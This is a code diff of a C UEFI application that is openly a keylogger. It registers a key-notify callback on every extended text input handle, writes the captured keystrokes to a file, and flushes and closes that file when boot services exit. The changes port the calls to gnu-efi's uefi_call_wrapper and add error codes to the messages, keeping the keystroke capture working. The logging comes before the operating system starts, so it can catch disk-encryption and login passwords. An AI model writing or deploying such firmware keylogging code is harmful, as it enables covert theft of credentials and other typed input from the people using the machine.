@@ -51,7 +51,7 @@ EFI_STATUS EFIAPI key_notify_function(EFI_KEY_DATA *KeyData)
     // now write to the file
 
     UINTN messageSize = StrLen(buffer) * sizeof(CHAR16);
-    const UINTN Status = File->Write(File, &messageSize, &buffer);
+    const UINTN Status = uefi_call_wrapper(File->Write, 3, File, &messageSize, &buffer);
     if (EFI_ERROR(Status))
     {
         return Status;
@@ -69,9 +69,9 @@ VOID EFIAPI exit_boot_services (IN EFI_EVENT Event, IN VOID *Context)
     // note that WE ARE NOT ALLOWED TO MODIFY MEMORY
     // that means no addressing, freeing, etc.
     // so basically we can't write to the file or declare variables or anything fancy like that.
-    File->Flush(File);
+    uefi_call_wrapper(File->Flush, 1, File);
 
-    File->Close(File);
+    uefi_call_wrapper(File->Close, 1, File);
 }
 
 EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
@@ -86,7 +86,7 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
     InitializeLib(ImageHandle, SystemTable);
 
     // create exit boot services event
-    Status = gBS->CreateEvent(
+    Status = uefi_call_wrapper(BS->CreateEvent, 5,
         EVT_SIGNAL_EXIT_BOOT_SERVICES, // type
         TPL_NOTIFY,
         exit_boot_services,            // function to call
@@ -134,23 +134,23 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
 
     // Now for the fun: logging keystrokes!!
     // Locate all handles that support the EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL
-    Status = BS->LocateHandleBuffer(ByProtocol, &gEfiSimpleTextInputExProtocolGuid, NULL, &HandleCount, &HandleBuffer);
+    Status = uefi_call_wrapper(BS->LocateHandleBuffer, 5, ByProtocol, &gEfiSimpleTextInputExProtocolGuid, NULL, &HandleCount, &HandleBuffer);
     if (EFI_ERROR(Status)) {
-        Print(L"Failed to locate handles for Simple Text Input Ex Protocol\n");
+        Print(L"Failed to locate handles for Simple Text Input Ex Protocol. Error code %d\n", Status);
         return Status;
     }
 
     for (UINTN i = 0; i < HandleCount; i++) {
-        Status = BS->HandleProtocol(HandleBuffer[i], &gEfiSimpleTextInputExProtocolGuid, (VOID **)&KeyboardProtocol);
+        Status = uefi_call_wrapper(BS->HandleProtocol, 3, HandleBuffer[i], &gEfiSimpleTextInputExProtocolGuid, &KeyboardProtocol);
         if (!EFI_ERROR(Status)) {
-            Status = KeyboardProtocol->RegisterKeyNotify(KeyboardProtocol, NULL, key_notify_function, &KeyEvent);
+            Status = uefi_call_wrapper(KeyboardProtocol->RegisterKeyNotify, 4, KeyboardProtocol, NULL, key_notify_function, &KeyEvent);
             if (EFI_ERROR(Status)) {
-                Print(L"Failed to register key notify function\n");
+                Print(L"Failed to register key notify function. Error code %d\n", Status);
             }
         }
     }
 
-    BS->FreePool(HandleBuffer);
+    uefi_call_wrapper(BS->FreePool, 1, HandleBuffer);
 
     return EFI_SUCCESS;
 }
